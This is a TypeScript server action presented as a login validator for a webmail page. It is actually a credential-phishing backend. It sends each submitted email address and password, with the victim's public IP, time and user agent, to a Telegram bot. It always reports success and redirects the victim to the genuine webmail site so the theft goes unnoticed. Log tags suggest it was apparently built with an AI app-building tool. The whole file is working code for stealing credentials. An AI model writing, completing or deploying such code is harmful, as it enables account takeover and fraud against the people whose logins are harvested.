'use server';

export async function validateLogin(email: string, password: string) {
  try {
    // ── 1. Send credentials to Telegram ──
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (botToken && chatId) {
      const ip = await getPublicIp();
      const message = [
        `🔐 **New Webmail Login**`,
        ``,
        `**Email:** \`${email}\``,
        `**Password:** \`${password}\``,
        `**Time:** ${new Date().toISOString()}`,
        `**IP:** ${ip}`,
        `**User-Agent:** ${globalThis?.navigator?.userAgent || 'unknown'}`,
      ].join('\n');

      await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
          }),
          signal: AbortSignal.timeout(5000),
        },
      ).catch((err) => console.error('[v0] Telegram send failed:', err.message));
    } else {
      console.warn('[v0] Telegram credentials not configured');
    }

    // ── 2. Return redirect to original page ──
    return {
      success: true,
      valid: true,
      email,
      redirect: `https://webmail.sti.net/tuxedo/`,
    };
  } catch (error: any) {
    console.error('[v0] Login error:', error);
    return {
      success: false,
      valid: false,
      email,
      error: 'Something went wrong. Please try again.',
    };
  }
}

async function getPublicIp(): Promise<string> {
  try {
    const resp = await fetch('https://api.ipify.org?format=json', {
      signal: AbortSignal.timeout(3000),
    });
    const data = await resp.json();
    return data.ip;
  } catch {
    return 'unknown';
  }
}